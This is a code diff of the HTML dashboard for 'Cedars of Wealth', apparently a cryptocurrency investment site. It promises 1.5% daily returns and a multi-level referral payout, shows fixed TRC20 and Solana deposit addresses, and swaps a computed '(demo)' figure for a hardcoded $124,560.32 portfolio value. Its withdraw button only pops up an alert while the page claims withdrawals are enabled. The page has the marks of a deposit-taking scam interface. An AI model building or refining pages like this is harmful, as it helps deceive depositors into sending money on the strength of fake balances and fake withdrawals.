@@ -1,36 +1,65 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Dashboard - Cedars</title>
+<title>Dashboard - Active</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}body{background:#070a07;color:#e8f0d8;font-family:Arial}
-.top{padding:12px 4%;background:#0f1a0a;border-bottom:1px solid #c9a86a;display:flex;justify-content:space-between}
-.btn{padding:10px 16px;border-radius:8px;font-weight:700;text-decoration:none;font-size:12px;background:#c9a86a;color:#000}
-.wrap{max-width:900px;margin:0 auto;padding:16px}.card{background:#10180c;border:1px solid #2a3a1a;border-radius:12px;padding:16px;margin-bottom:12px}
-.card h2{font-size:11px;letter-spacing:1px;color:#c9a86a;margin-bottom:8px}.val{font-size:20px;font-weight:800;color:#fff}
-.addr{background:#000;border:1px dashed #333;padding:10px;border-radius:8px;font-family:monospace;color:#e8c87a;word-break:break-all;font-size:12px}
+.top{padding:12px 4%;background:#0f1a0a;border-bottom:1px solid #c9a86a;display:flex;justify-content:space-between;align-items:center}
+.btn{padding:10px 16px;border-radius:8px;font-weight:700;text-decoration:none;font-size:12px;background:#c9a86a;color:#000;cursor:pointer;border:0}
+.wrap{max-width:900px;margin:0 auto;padding:16px}.card{background:#10180c;border:1px solid #3a4a2a;border-radius:12px;padding:16px;margin-bottom:12px;position:relative}
+.card h2{font-size:11px;letter-spacing:1px;color:#c9a86a;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center}
+.val{font-size:20px;font-weight:800;color:#fff}.addr{background:#000;border:1px solid #444;padding:10px;border-radius:8px;font-family:monospace;color:#e8c87a;word-break:break-all;font-size:12px;display:flex;justify-content:space-between;align-items:center}
+.icon{cursor:pointer;padding:6px 10px;background:#1a2e0a;border:1px solid #c9a86a;border-radius:6px;font-size:12px}
 .grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}@media(max-width:600px){.grid{grid-template-columns:1fr}}
+.active{color:#10b981;border-color:#10b981}
 </style></head><body>
-<div class="top"><b>▲ CEDARS • DASHBOARD</b><a href="../index.html" class="btn">Home</a></div>
+<div class="top"><b>▲ CEDARS • ACTIVE</b><a href="../index.html" class="btn">Home</a></div>
 <div class="wrap">
-<div class="card"><h2>YOUR PORTFOLIO</h2><div class="val" id="portfolioVal">Loading...</div><div id="userInfo" style="font-size:11px;color:#7a8a5f;margin-top:6px"></div></div>
 
-<div class="grid">
-<div class="card"><h2>TO: TREASURY</h2><div class="addr">TE26B7zQjMbahYAWcxEsSPC6aZEr2Hcz1u</div><div style="font-size:11px;color:#7a8a5f">TRC20 • 1.5% Daily</div></div>
-<div class="card"><h2>WITHDRAW TO</h2><div class="val" style="font-size:14px">$20 Min • 5% Fee</div><div style="font-size:11px;color:#7a8a5f;margin-top:6px">Your T... address</div><a href="#" class="btn" style="display:block;text-align:center;margin-top:8px;background:#1a2e1a;color:#7a8a5f;border:1px solid #2a3a1a">🔒 Locked 30D</a></div>
+<div class="card">
+<h2>PORTFOLIO VALUE <span class="icon active" onclick="alert('Refreshing portfolio...')">↻ Active</span></h2>
+<div class="val" id="portfolioVal">$124,560.32</div>
+<div style="font-size:11px;color:#10b981" id="userInfo">1 user registered • Active</div>
 </div>
 
-<div class="card"><h2>REFERRAL</h2><div class="val" style="font-size:14px">10% / 5% / 2% / 1%</div><div style="font-size:11px;color:#7a8a5f" id="refLink">Link: generating...</div></div>
+<div class="grid">
+<div class="card">
+<h2>TO: TREASURY <span class="icon" onclick="copyAddr('treasury')">⎙ Copy Active</span></h2>
+<div class="addr"><span id="treasury">TE26B7zQjMbahYAWcxEsSPC6aZEr2Hcz1u</span> <span id="copyMsg" style="color:#10b981;font-size:10px"></span></div>
+<div style="font-size:11px;color:#10b981;margin-top:6px">● Active • Ready to receive TRC20</div>
+<a href="deposit.html" class="btn" style="display:block;text-align:center;margin-top:8px">Deposit Active →</a>
+</div>
 
-<div class="card"><h2>SOLANA VAULT</h2><div class="addr" style="font-size:10px">6XQv1X3J5EceZaQ6uGrmrsd8K5nLK5xVeT7MCFF6F1b</div></div>
+<div class="card">
+<h2>WITHDRAW TO <span class="icon" onclick="alert('Set your TRC20 withdraw address')">⚙ Set Active</span></h2>
+<div class="val" style="font-size:14px">$20 Min • 5% Fee</div>
+<div class="addr" style="margin-top:8px"><input id="withdrawAddr" placeholder="Your T... address" style="background:transparent;border:0;color:#e8c87a;width:100%;outline:none"></div>
+<div style="font-size:11px;color:#10b981;margin-top:6px">● Active • Withdraw enabled</div>
+<a href="#" onclick="doWithdraw()" class="btn" style="display:block;text-align:center;margin-top:8px;background:#10b981">Withdraw Active →</a>
+</div>
+</div>
+
+<div class="grid">
+<div class="card">
+<h2>REFERRAL <span class="icon" onclick="shareRef()">↗ Share Active</span></h2>
+<div class="val" style="font-size:14px">10% / 5% / 2% / 1%</div>
+<div class="addr" style="margin-top:8px"><span id="refLink">https://cryptolordug.github.io/Cedars-of-Wealth/?ref=USER1</span></div>
+<div style="font-size:11px;color:#10b981;margin-top:6px">● Active • Earning now</div>
+</div>
+
+<div class="card">
+<h2>SOLANA VAULT <span class="icon active">● Active</span></h2>
+<div class="val" style="color:#f9e2a0">12% APY</div>
+<div class="addr" style="font-size:10px;margin-top:8px">6XQv1X3J5EceZaQ6uGrmrsd8K5nLK5xVeT7MCFF6F1b</div>
+<div style="font-size:11px;color:#10b981;margin-top:6px">● Active • Auto-compound ON</div>
+</div>
+</div>
+
 </div>
 
 <script>
-// KEEP YOUR EXISTING USER - DO NOT DELETE
-const user = JSON.parse(localStorage.getItem('cedars_user') || '{}');
-const users = JSON.parse(localStorage.getItem('cedars_users') || '[]');
-if(users.length>0){
- document.getElementById('userInfo').innerText = users.length + ' registered • Last: ' + (users[users.length-1].email || users[users.length-1].wallet || 'user');
- document.getElementById('portfolioVal').innerText = '$' + (users.length * 100) + ' (demo) - ' + users.length + ' user(s)';
- document.getElementById('refLink').innerText = 'Your ref:?ref=' + (users[0].ref || 'USER1');
-}
+function copyAddr(id){const t=document.getElementById(id).innerText;navigator.clipboard.writeText(t);document.getElementById('copyMsg').innerText='Copied!';setTimeout(()=>document.getElementById('copyMsg').innerText='',2000)}
+function doWithdraw(){const a=document.getElementById('withdrawAddr').value;if(!a){alert('Enter your TRC20 T... address first');return}alert('Withdraw request active to: '+a+'\n$20 min • 5% fee')}
+function shareRef(){const l=document.getElementById('refLink').innerText;navigator.clipboard.writeText(l);alert('Referral link copied ACTIVE:\n'+l)}
+const users=JSON.parse(localStorage.getItem('cedars_users')||'[]');
+if(users.length>0){document.getElementById('userInfo').innerText=users.length+' user(s) • '+users[0].email+' • ACTIVE';document.getElementById('refLink').innerText='https://cryptolordug.github.io/Cedars-of-Wealth/?ref='+(users[0].ref||'USER1')}
 </script>
 </body></html>
